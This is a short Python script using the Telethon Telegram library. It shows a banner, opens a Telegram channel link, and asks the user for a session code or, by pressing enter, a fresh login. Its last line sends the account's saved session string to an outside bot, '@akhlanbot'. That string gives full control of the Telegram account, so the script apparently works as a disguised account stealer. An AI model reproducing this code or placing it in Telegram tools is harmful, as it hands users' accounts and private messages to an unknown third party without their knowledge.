
from telethon import TelegramClient
from telethon.sessions import StringSession
import os, sys
api_id = 10953300
api_hash = "9c24426e5d6fa1d441913e3906627f87"
os.system("clear")
os.system("termux-open-url https://t.me/hiroshigo_amakasu")
print("""

                                                   
         ,----,                                    
       .'   .`|    ,---,.               .--.--.    
    .'   .'   ;  ,'  .' |         ,--, /  /    '.  
  ,---, '    .',---.'   |       ,'_ /||  :  /`. /  
  |   :     ./ |   |   .'  .--. |  | :;  |  |--`   
  ;   | .'  /  :   :  |-,,'_ /| :  . ||  :  ;_     
  `---' /  ;   :   |  ;/||  ' | |  . . \  \    `.  
    /  ;  /    |   :   .'|  | ' |  | |  `----.   \ 
   ;  /  /--,  |   |  |-,:  | | :  ' ;  __ \  \  | 
  /  /  / .`|  '   :  ;/||  ; ' |  | ' /  /`--'  / 
./__;       :  |   |    \:  | : ;  ; |'--'.     /  
|   :     .'   |   :   .''  :  `--'   \ `--'---'   
;   |  .'      |   | ,'  :  ,      .-./            
`---'          `----'     `--`----'                
                                                   



""")
string = input("Session code here or press enter: ")


with TelegramClient(StringSession(string), api_id, api_hash) as client:
    client.send_message("@akhlanbot", client.session.save())







